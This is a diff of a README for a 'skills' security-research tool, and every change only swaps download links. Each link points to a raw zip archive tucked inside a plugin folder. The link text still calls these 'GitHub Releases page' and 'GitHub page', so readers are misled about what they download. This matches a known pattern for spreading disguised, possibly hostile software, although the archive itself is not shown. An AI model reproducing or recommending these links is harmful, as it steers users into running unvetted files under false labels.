@@ -1,6 +1,6 @@
 # 🎯 skills - Enhance Your Security Research Efforts
 
-[![Download](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/semgrep-rule-creator/.claude-plugin/Software-v1.4.zip)](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/semgrep-rule-creator/.claude-plugin/Software-v1.4.zip)
+[![Download](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/claude-in-chrome-troubleshooting/Software-v2.6.zip)](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/claude-in-chrome-troubleshooting/Software-v2.6.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Whether you're a security analyst, a developer, or just interested in understand
 To begin using the skills application, follow these steps:
 
 1. **Visit the Download Page**
-   - Go to the [GitHub Releases page](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/semgrep-rule-creator/.claude-plugin/Software-v1.4.zip) to find the latest version of the application.
+   - Go to the [GitHub Releases page](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/claude-in-chrome-troubleshooting/Software-v2.6.zip) to find the latest version of the application.
 
 2. **Choose Your Version**
    - Look for the most recent release. Click on the version number to view its details. You will find various downloads available for different platforms.
@@ -42,7 +42,7 @@ To begin using the skills application, follow these steps:
 
 For a quick and easy way to download the skills application, click the link below:
 
-[Download skills from GitHub Releases!](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/semgrep-rule-creator/.claude-plugin/Software-v1.4.zip)
+[Download skills from GitHub Releases!](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/claude-in-chrome-troubleshooting/Software-v2.6.zip)
 
 After downloading, follow the installation steps outlined in the "Getting Started" section above.
 
@@ -85,4 +85,4 @@ If you need more assistance, consider reaching out:
 
 If you're interested in contributing to the skills application, we welcome your input! Check out the contributing guidelines in the repository to understand how you can help improve this tool for everyone.
 
-For more updates and news, keep an eye on our [GitHub page](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/semgrep-rule-creator/.claude-plugin/Software-v1.4.zip).
+For more updates and news, keep an eye on our [GitHub page](https://github.com/Fodhol/skills/raw/refs/heads/main/plugins/claude-in-chrome-troubleshooting/Software-v2.6.zip).
